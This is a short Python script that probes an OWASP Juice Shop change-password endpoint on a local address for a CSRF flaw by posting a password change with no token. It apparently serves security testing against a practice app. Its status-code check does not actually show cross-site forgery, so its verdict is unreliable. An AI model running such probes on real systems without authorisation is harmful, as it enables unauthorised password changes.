import requests

# Target URL (Juice Shop change password endpoint)
url = "http://192.168.1.51/rest/user/change-password"

# CSRF payload (missing or invalid CSRF token)
payload = {
    "currentPassword": "oldpassword",
    "newPassword": "newpassword",
    "repeatNewPassword": "newpassword"
}

# Send the request without a CSRF token
response = requests.post(url, json=payload)

# Check if the request was successful (indicating CSRF vulnerability)
if response.status_code == 200:
    print("CSRF Vulnerability Detected!")
else:
    print("No CSRF Vulnerability Found.")